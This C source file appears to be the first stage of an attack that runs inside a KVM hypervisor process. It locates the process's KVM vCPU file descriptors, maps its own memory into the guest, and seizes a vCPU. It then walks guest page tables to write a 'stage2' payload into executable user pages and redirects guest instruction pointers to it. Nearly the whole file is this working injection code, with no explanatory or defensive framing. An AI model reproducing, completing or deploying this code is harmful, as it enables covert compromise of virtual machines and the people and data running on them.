#define _GNU_SOURCE

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <linux/futex.h>
#include <linux/kvm.h>

#include "stage1.h"

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define STAGE2_MAGIC "AVADAKEDAVRA"
#define STAGE2_MAGIC_LEN (sizeof(STAGE2_MAGIC) - 1)

#define RED_ZONE_LEN 128

#define VCPU_IO_PORT 0xe9
#define GETDENTS_BUF_SIZE 1024
#define PROC_PATH_MAX_LEN 256
#define CLONE_THREAD_FLAGS (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_PARENT | CLONE_THREAD | CLONE_IO)
#define assert(x) { if (!(x)) { \
	const char *msg = __FILE__ ":" STR(__LINE__) ": " STR(x) "\n"; \
	syscall(SYS_write, STDERR_FILENO, msg, strlen(msg)); \
	syscall(SYS_write, STDERR_FILENO, NULL, 0); \
	while (!(x)) syscall(SYS_pause); }}

/* cribbed from https://github.com/dpw/kvm-hello-world/blob/master/kvm-hello-world.c */

/* CR0 bits */
#define CR0_PE 1u
#define CR0_MP (1U << 1)
#define CR0_EM (1U << 2)
#define CR0_TS (1U << 3)
#define CR0_ET (1U << 4)
#define CR0_NE (1U << 5)
#define CR0_WP (1U << 16)
#define CR0_AM (1U << 18)
#define CR0_NW (1U << 29)
#define CR0_CD (1U << 30)
#define CR0_PG (1U << 31)

/* CR4 bits */
#define CR4_VME 1
#define CR4_PVI (1U << 1)
#define CR4_TSD (1U << 2)
#define CR4_DE (1U << 3)
#define CR4_PSE (1U << 4)
#define CR4_PAE (1U << 5)
#define CR4_MCE (1U << 6)
#define CR4_PGE (1U << 7)
#define CR4_PCE (1U << 8)
#define CR4_OSFXSR (1U << 8)
#define CR4_OSXMMEXCPT (1U << 10)
#define CR4_UMIP (1U << 11)
#define CR4_VMXE (1U << 13)
#define CR4_SMXE (1U << 14)
#define CR4_FSGSBASE (1U << 16)
#define CR4_PCIDE (1U << 17)
#define CR4_OSXSAVE (1U << 18)
#define CR4_SMEP (1U << 20)
#define CR4_SMAP (1U << 21)

/* EFER bits */
#define EFER_SCE 1
#define EFER_LME (1U << 8)
#define EFER_LMA (1U << 10)
#define EFER_NXE (1U << 11)

/* 64-bit page * entry bits */
#define PDE64_PRESENT (1UL << 0)
#define PDE64_RW (1UL << 1)
#define PDE64_USER (1UL << 2)
#define PDE64_ACCESSED (1UL << 5)
#define PDE64_DIRTY (1UL << 6)
#define PDE64_PS (1UL << 7)
#define PDE64_G (1UL << 8)
#define PDE64_NX (1UL << 63)

/* end cribbed */

/* we can't include stdlib.h so... */
extern int atoi (const char *__nptr)
     __THROW __attribute_pure__ __nonnull ((1)) __wur;

extern unsigned long int strtoul (const char *__restrict __nptr,
                                  char **__restrict __endptr, int __base)
     __THROW __nonnull ((1));

struct kvm_state {
	int kvm_fd;
	int vm_fd;
	int nr_memslots;
	struct kvm_userspace_memory_region memslot;
	int vcpus_len;
	struct {
		int fd;
		struct kvm_regs regs;
		struct kvm_sregs sregs;
	} vcpus[128];
};

static int sync_kvm(struct kvm_state *kvm_state);
static int add_memslot(struct kvm_state *kvm_state, void *base, size_t len);
static int del_memslot(struct kvm_state *kvm_state);
static int seize_vcpu(struct kvm_state *kvm_state, struct shell_state *state);
static int restore_vcpu(struct kvm_state *kvm_state, int vcpu_idx);

static volatile uint32_t child_exit;

_Noreturn
static void vcpu_pen(struct kvm_state *kvm_state, void *stage2_start, size_t stage2_len);

static int shell_main(void *argp);

static int sync_kvm(struct kvm_state *kvm_state) {
	int proc_self_fds_fd = syscall(SYS_open, "/proc/self/fd", O_RDONLY | O_DIRECTORY | O_CLOEXEC, 0);
	if (proc_self_fds_fd < 0)
		goto error;

	int vcpu_idx = 0;

	kvm_state->kvm_fd = -1;
	kvm_state->vm_fd = -1;
	kvm_state->nr_memslots = -1;
	kvm_state->vcpus_len = -1;

	while (true) {
		char getdents_buf[GETDENTS_BUF_SIZE];
		int nread = syscall(SYS_getdents64, proc_self_fds_fd, getdents_buf, GETDENTS_BUF_SIZE);
		if (nread < 0)
			goto error;

		if (nread == 0)
			break;

		for (long bpos = 0; bpos < nread;) {
			struct dirent64 *proc_fd_de = (struct dirent64 *) (getdents_buf + bpos);
			bpos += proc_fd_de->d_reclen;

			if (proc_fd_de->d_type != DT_LNK)
				continue;

			char ln_path[PROC_PATH_MAX_LEN];
			int r = syscall(SYS_readlinkat, proc_self_fds_fd, proc_fd_de->d_name, ln_path, PROC_PATH_MAX_LEN);

			if (r < 0)
				goto error;

			ln_path[r] = '\0';

			int proc_self_fd = atoi(proc_fd_de->d_name);

			if (strncmp(ln_path, "anon_inode:kvm-vcpu:", strlen("anon_inode:kvm-vcpu:")) == 0) {
				int ioctl_r;

				kvm_state->vcpus[vcpu_idx].fd = proc_self_fd;

				struct kvm_sregs sregs;

				ioctl_r = syscall(SYS_ioctl,
					kvm_state->vcpus[vcpu_idx].fd,
					KVM_GET_SREGS,
					&sregs);

				if (ioctl_r < 0)
					goto error;

				bool user_space = !!(sregs.cs.selector & 3);
				bool paging = (sregs.cr0 >> 31) & 1;
				bool pae = (sregs.cr4 >> 5) & 1;
				bool long_mode = (sregs.efer >> 8) & 1;

				bool p4l = paging && pae && long_mode;

				if (!(user_space && p4l)) {
					kvm_state->vcpus_len = vcpu_idx;
					continue;
				}

				struct kvm_regs regs;

				ioctl_r = syscall(SYS_ioctl,
					kvm_state->vcpus[vcpu_idx].fd,
					KVM_GET_REGS,
					&regs);

				if (ioctl_r < 0)
					goto error;

				kvm_state->vcpus[vcpu_idx].sregs = sregs;
				kvm_state->vcpus[vcpu_idx].regs = regs;

				kvm_state->vcpus_len = ++vcpu_idx;
			} else if (strncmp(ln_path, "anon_inode:kvm-vm", strlen("anon_inode:kvm-vm")) == 0) {
				kvm_state->vm_fd = proc_self_fd;

				kvm_state->nr_memslots = syscall(SYS_ioctl,
					kvm_state->vm_fd,
					KVM_CHECK_EXTENSION,
					KVM_CAP_NR_MEMSLOTS);

				if (kvm_state->nr_memslots < 0)
					goto error;
			} else if (strncmp(ln_path, "/dev/kvm", strlen("/dev/kvm")) == 0) {
				kvm_state->kvm_fd = proc_self_fd;
                        }
		}
	}

	if ((kvm_state->kvm_fd < 0) || (kvm_state->vm_fd < 0) || (kvm_state->vcpus_len < 0))
		goto error;

	syscall(SYS_close, proc_self_fds_fd);
	return 0;

error:
	syscall(SYS_close, proc_self_fds_fd);
	return -1;
}

static int del_memslot(struct kvm_state *kvm_state) {
	kvm_state->memslot.memory_size = 0;

	return syscall(SYS_ioctl,
		kvm_state->vm_fd,
		KVM_SET_USER_MEMORY_REGION,
		&kvm_state->memslot);
}

static int add_memslot(struct kvm_state *kvm_state, void *base, size_t len) {
	struct kvm_userspace_memory_region memslot;

	memslot.flags = 0;
	memslot.memory_size = len;
	memslot.userspace_addr = (uint64_t) base;

	for (int slot = 0; slot < kvm_state->nr_memslots; slot++) {
		memslot.slot = slot;

		for (size_t hpage = 0; hpage < (1UL << 33); hpage++) {
			memslot.guest_phys_addr = hpage << 33;
			errno = 0;

			int r = syscall(SYS_ioctl,
				kvm_state->vm_fd,
				KVM_SET_USER_MEMORY_REGION,
				&memslot);

			if ((r < 0) && (errno != EEXIST))
				break;

			if (r < 0)
				continue;

			kvm_state->memslot = memslot;
			return 0;
		}
	}

	return -1;
}

static int can_infect_page(char *page, uint64_t page_len, size_t min_len) {
	if (memcmp(page + page_len - STAGE2_MAGIC_LEN, STAGE2_MAGIC, STAGE2_MAGIC_LEN) == 0) {
		return -EEXIST;
	}

	for (uint64_t idx = page_len - min_len; idx < page_len; idx++) {
		if ((page[idx] != 0x90) && (page[idx] != 0x00)) {
			return -EINVAL;
		}
	}

	return 0;
}

static int virt_to_phy(uint64_t cr3, uint64_t virt, uint64_t *phy) {
	uint64_t *tbl = (void *)((cr3 >> 12) << 12);

	for (int lvl = 3; lvl >= 0; lvl--) {
		uint64_t shift = 12 + (9 * lvl);
		int idx = (virt >> shift) & 0x1ff;
		uint64_t ptble = tbl[idx];

		if (!(ptble & PDE64_PRESENT))
			return -EINVAL;

		if ((lvl == 0) || (ptble & PDE64_PS)) {
			*phy = ((((ptble >> shift) << shift) << 16) >> 16) + (virt & ((1 << shift) - 1));
			return 0;
		} else {
			tbl = (uint64_t *) ((((ptble >> 12) << 12) << 16) >> 16);
		}
	}

	return -EINVAL;
}

static int find_infectable_page(uint64_t cr3, size_t min_len, void **phy_addr, void **virt_addr) {
	uint64_t *pml4 = (void *)((cr3 >> 12) << 12);

	struct {
		uint64_t *tbl;
		int idx;
	} stack[4];

	stack[0].tbl = pml4;
	stack[0].idx = 256;

	int stack_top = 0;

	while (stack_top >= 0) {
		int idx = --stack[stack_top].idx;
		if (idx < 0) {
			stack_top--;
			continue;
		}

		uint64_t ptble = stack[stack_top].tbl[idx];

		if (!(ptble & PDE64_NX) && (ptble & PDE64_PRESENT) && (ptble & PDE64_USER) && !(ptble & (0xfUL << 48))) {
			if ((stack_top < 3) && !(ptble & PDE64_PS)) {
				stack_top++;

				stack[stack_top].tbl = (uint64_t *) ((((ptble >> 12) << 12) << 16) >> 16);
				stack[stack_top].idx = 512;
			} else if ((ptble & PDE64_PS) || (stack_top == 3)) {
				int shift = 12 + (3 - stack_top) * 9;
				uint64_t tmp_phy_addr = (((ptble >> shift) << shift) << 16) >> 16;
				uint64_t len = 1 << shift;

				uint64_t tmp_virt_addr = 0;
				switch (stack_top) {
					case 3:
						tmp_virt_addr += ((uint64_t) stack[3].idx) << 12;

					case 2:
						tmp_virt_addr += ((uint64_t) stack[2].idx) << 21;

					case 1:
						tmp_virt_addr += ((uint64_t) stack[1].idx) << 30;

					case 0:
						tmp_virt_addr += ((uint64_t) stack[0].idx) << 39;
				}

				int r = can_infect_page((char *) tmp_phy_addr, len, min_len);
				if ((r == -EEXIST) || (r == 0)) {
					*phy_addr = (void *) (tmp_phy_addr + len - min_len);
					*virt_addr = (void *) (tmp_virt_addr + len - min_len);

					return r;
				}
			}
		}
	}

	return -EAGAIN;
}

static void outb(uint16_t port, uint8_t value) {
	asm("outb %0,%1" :: "a" (value), "Nd" (port) : "memory");
}

_Noreturn
static void halt() {
	while (true);
}

_Noreturn
static void vcpu_pen(struct kvm_state *kvm_state, void *stage2_start, size_t stage2_len) {
	for (int idx = 0; idx < kvm_state->vcpus_len; idx++) {
		uint64_t rip_top = ((kvm_state->vcpus[idx].regs.rip >> 12) + 1) << 12;
		int r = virt_to_phy(kvm_state->vcpus[idx].sregs.cr3, rip_top, (void *) &rip_top);
		if (r < 0)
			continue;

		if (memcmp((void *) (rip_top - STAGE2_MAGIC_LEN), STAGE2_MAGIC, STAGE2_MAGIC_LEN) == 0)
			continue;

		void *phy_addr;
		void *virt_addr;

		r = find_infectable_page(
			kvm_state->vcpus[idx].sregs.cr3,
			stage2_len + STAGE2_MAGIC_LEN,
			&phy_addr, &virt_addr);

		if ((r == 0) || (r == -EEXIST)) {
			kvm_state->vcpus[idx].regs.rsp -= RED_ZONE_LEN + sizeof(uint64_t);

			uint64_t *phy_rsp;
			int r = virt_to_phy(
				kvm_state->vcpus[idx].sregs.cr3,
				kvm_state->vcpus[idx].regs.rsp,
				(void *) &phy_rsp);
			if (r < 0)
				continue;

			*phy_rsp = kvm_state->vcpus[idx].regs.rip;

			kvm_state->vcpus[idx].regs.rip = (uint64_t) virt_addr;

			if (r == 0) {
				memcpy(phy_addr, stage2_start, stage2_len);
				memcpy(phy_addr + stage2_len, STAGE2_MAGIC, STAGE2_MAGIC_LEN);
			}
		}
	}

	outb(VCPU_IO_PORT, 0x42);
	halt();
}

static int seize_vcpu(struct kvm_state *kvm_state, struct shell_state *state) {
	int r;

	struct kvm_sregs sregs;
	memset(&sregs, 0, sizeof(sregs));

	sregs.tr = (struct kvm_segment) {
		.base = 0,
		.limit = 0,
		.selector = 0,
		.present = 1,
		.type = 11,
		.dpl = 0,
		.db = 0,
		.s = 0,
		.l = 0,
		.g = 0,
	};

	struct kvm_segment seg = {
		.base = 0,
		.limit = 0xffffffff,
		.selector = 1 << 3,
		.present = 1,
		.type = 11,
		.dpl = 0,
		.db = 0,
		.s = 1,
		.l = 1,
		.g = 1,
	};

	sregs.cs = seg;

	seg.type = 3;
	seg.selector = 2 << 3;

	sregs.ds = sregs.ss = sregs.es = sregs.fs = sregs.gs = seg;

	for (uint64_t idx = 0; idx < 512; idx++)
		state->shell_vcpu_pdpt[idx] = (idx << 30) | PDE64_PS | PDE64_PRESENT | PDE64_RW | PDE64_USER;

	uint64_t pml4e = ((uint64_t) state->shell_vcpu_pdpt) - ((uint64_t) state->shell_hook);
	pml4e = (pml4e + kvm_state->memslot.guest_phys_addr) | PDE64_PRESENT | PDE64_RW | PDE64_USER;
	state->shell_vcpu_pml4[0] = pml4e;

	sregs.cr3 = ((uint64_t) state->shell_vcpu_pml4) - ((uint64_t) state->shell_hook);
	sregs.cr3 += kvm_state->memslot.guest_phys_addr;

	sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;
	sregs.cr4 = CR4_PAE;
	sregs.efer = EFER_LME | EFER_LMA;

	r = syscall(SYS_ioctl,
		kvm_state->vcpus[0].fd,
		KVM_SET_SREGS,
		&sregs);

	if (r < 0)
		return r;

	struct kvm_regs regs;
	memset(&regs, 0, sizeof(regs));

	regs.rip = ((uint64_t) vcpu_pen) - ((uint64_t) state->shell_hook);
	regs.rip += kvm_state->memslot.guest_phys_addr;

	regs.rsp = ((uint64_t) state->shell_vcpu_stack) - ((uint64_t) state->shell_hook) + SHELL_VCPU_STACK_SIZE;
	regs.rsp += kvm_state->memslot.guest_phys_addr;

	regs.rdi = ((uint64_t) kvm_state) - ((uint64_t) state->shell_hook);
	regs.rdi += kvm_state->memslot.guest_phys_addr;

	regs.rsi = ((uint64_t) state->shell_stage2_start) - ((uint64_t) state->shell_hook);
	regs.rsi += kvm_state->memslot.guest_phys_addr;

	regs.rdx = state->shell_stage2_len;

	r = syscall(SYS_ioctl,
		kvm_state->vcpus[0].fd,
		KVM_SET_REGS,
		&regs);

	if (r < 0)
		return r;

	return r;
}

static int restore_vcpu(struct kvm_state *kvm_state, int vcpu_idx) {
	int r;

	r = syscall(SYS_ioctl,
		kvm_state->vcpus[vcpu_idx].fd,
		KVM_SET_SREGS,
		&kvm_state->vcpus[vcpu_idx].sregs);

	if (r < 0)
		return r;

	r = syscall(SYS_ioctl,
		kvm_state->vcpus[vcpu_idx].fd,
		KVM_SET_REGS,
		&kvm_state->vcpus[vcpu_idx].regs);

	return r;
}

static int run_vcpu(struct kvm_state *kvm_state) {
	int ret = 0;
	long r;

	r = syscall(SYS_ioctl, kvm_state->kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
	if (r < 0)
		return -1;

	size_t kvm_run_len = r;

	struct kvm_run *run = (void *) syscall(SYS_mmap,
		NULL, kvm_run_len,
		PROT_READ | PROT_WRITE, MAP_SHARED,
		kvm_state->vcpus[0].fd, 0);

	if (run == MAP_FAILED)
		return -1;

	do {
		ret = -1;
		syscall(SYS_write, STDOUT_FILENO, "RUN\n", 4);
		syscall(SYS_write, STDOUT_FILENO, NULL, 0);

		r = syscall(SYS_ioctl, kvm_state->vcpus[0].fd, KVM_RUN, 0);
		if (r < 0) {
			goto exit;
		}

		syscall(SYS_write, STDOUT_FILENO, "KVM_EXIT_", 9);
		switch (run->exit_reason) {
			case KVM_EXIT_UNKNOWN:
				syscall(SYS_write, STDOUT_FILENO, "UNKNOWN\n", 8);
				syscall(SYS_write, STDOUT_FILENO, NULL, 0);
				goto exit;

			case KVM_EXIT_SHUTDOWN:
				syscall(SYS_write, STDOUT_FILENO, "SHUTDOWN\n", 9);
				syscall(SYS_write, STDOUT_FILENO, NULL, 0);
				goto exit;

			case KVM_EXIT_IO:
				syscall(SYS_write, STDOUT_FILENO, "IO\n", 3);
				syscall(SYS_write, STDOUT_FILENO, NULL, 0);

				if (!((run->io.direction == KVM_EXIT_IO_OUT) &&
					(run->io.port == VCPU_IO_PORT) &&
					(*((char *)run + run->io.data_offset) == 0x42)))
					goto exit;

				ret = 0;
				goto exit;

			case KVM_EXIT_FAIL_ENTRY:
				syscall(SYS_write, STDOUT_FILENO, "FAIL_ENTRY\n", 11);
				syscall(SYS_write, STDOUT_FILENO, NULL, 0);
				ret = 0;
				goto exit;

			default:
				syscall(SYS_write, STDOUT_FILENO, "OTHER(", 6);
				syscall(SYS_write, STDOUT_FILENO, &run->exit_reason, sizeof(run->exit_reason));
				syscall(SYS_write, STDOUT_FILENO, ")\n", 2);
				syscall(SYS_write, STDOUT_FILENO, NULL, 0);
				goto exit;
		}
	} while (true);

exit:
	r = syscall(SYS_munmap, run, kvm_run_len);
	if (r < 0)
		return -1;

	return ret;
}

_Noreturn
void start_c(void *argp) {
	struct shell_state *state = argp;
	child_exit = 0;
	state->shell_ret = 0;

	/* We have to clone here, because we might be running on a vcpu thread.
	 * In that case KVM_GET_(S)REGS might wake it up and kick us out!
	 * It also helps with running our own vcpu for later hacks.
	 */
	int r = clone(shell_main, state->shell_child_stack + SHELL_CHILD_STACK_SIZE, CLONE_THREAD_FLAGS, state);
	assert(r >= 0);

	syscall(SYS_futex, &child_exit, FUTEX_WAIT, 0);

	if (state->shell_locked)
		state->shell_cmd = SHELL_CMD_MMAP;

	else
		state->shell_cmd = -state->shell_ret;

	while (true);
}

static int memscan(void *buf, size_t len, uint64_t *ret) {
	int r = -1;
	int proc_self_maps_fd = syscall(SYS_open, "/proc/self/maps", O_RDONLY | O_CLOEXEC, 0);
	if (proc_self_maps_fd < 0)
		return -1;

	char maps[1024];

	if (syscall(SYS_read, proc_self_maps_fd, maps, sizeof(maps)) <= 0)
		goto clean_open;

	for (char *maps_end = maps + sizeof(maps);;) {
		char *ptr = maps;
		char *end_ptr;

		void *map_base = (void *) strtoul(ptr, &end_ptr, 16);
		ptr = end_ptr + 1;

		void *map_limit = (void *) strtoul(ptr, &end_ptr, 16);
		ptr = end_ptr + 1;

		if (*ptr == 'r') {
			for (void *cret = map_base; cret < map_limit; cret += (1 << 12)) {
				if (memcmp(cret, buf, len) == 0) {
					r = 0;
					*ret = (uint64_t) cret;
					goto clean_open;
				}
			}
		}

		while (true) {
			while ((ptr < maps_end) && (*ptr++ != '\n'));
			if ((*(ptr - 1) != '\n') && (syscall(SYS_read, proc_self_maps_fd, maps, sizeof(maps)) <= 0))
				goto clean_open;

			else if (*(ptr - 1) == '\n')
				break;
		}

		memmove(maps, ptr, maps_end - ptr);
		if (syscall(SYS_read, proc_self_maps_fd, maps + (maps_end - ptr), (ptr - maps)) <= 0)
			break;
	}

clean_open:
	if (syscall(SYS_close, proc_self_maps_fd) < 0)
		r = -1;

	return r;
}

static int shell_main(void *argp) {
	struct shell_state *state = argp;

	struct kvm_state kvm_state;
	int64_t r = sync_kvm(&kvm_state);
	assert(r >= 0);

	if (kvm_state.vcpus_len == 0) {
		state->shell_ret = -SHELL_CMD_AGAIN;
		goto exit;
	} else
		state->shell_ret = -SHELL_CMD_CONT;

	for (int idx = 0; idx < kvm_state.vcpus_len; idx++) {
		if ((kvm_state.vcpus[idx].regs.r14 == 0x67390a7494d83aa4) &&
			(kvm_state.vcpus[idx].regs.r15 == 0x8bdb9683da40e963)) {

			if (!state->shell_locked) {
				kvm_state.vcpus[idx].regs.rax = 0;

				uint64_t buf[2] = {
					0x0c58328fd3b6c5bb,
					kvm_state.vcpus[idx].regs.rsi
				};

				r = memscan((void *) buf, sizeof(buf), &state->shell_ret);
				assert(r >= 0);

				state->shell_locked = true;
			} else
				kvm_state.vcpus[idx].regs.rax = -1;

			kvm_state.vcpus[idx].regs.r14 = 0;
			kvm_state.vcpus[idx].regs.r15 = 0;

			r = restore_vcpu(&kvm_state, idx);
			assert(r >= 0);
		}
	}

	if (state->shell_locked)
		goto exit;

	r = add_memslot(&kvm_state, state->shell_hook, state->shell_len);
	assert(r >= 0);

	r = seize_vcpu(&kvm_state, state);
	assert(r >= 0);

	r = run_vcpu(&kvm_state);
	assert(r >= 0);

	r = del_memslot(&kvm_state);
	assert(r >= 0);

	r = restore_vcpu(&kvm_state, 0);
	assert(r >= 0);

exit:
	/* use assembly to make sure we don't touch the stack */
	asm volatile(
		"movq $1, child_exit(%%rip)\n\t"
		"\n\t"
		"lea child_exit(%%rip), %%rdi\n\t"
		"mov $"STR(FUTEX_WAKE)", %%rsi\n\t"
		"mov $1, %%rdx\n\t"
		"mov $"STR(SYS_futex)", %%rax\n\t"
		"syscall\n\t"
		"\n\t"
		".L_shell_main_exit:\n\t"
		"mov $0, %%rdi\n\t"
		"mov $"STR(SYS_exit)", %%rax\n\t"
		"syscall\n\t"
		"jmp .L_shell_main_exit\n"
	:::);

	return 0;
}
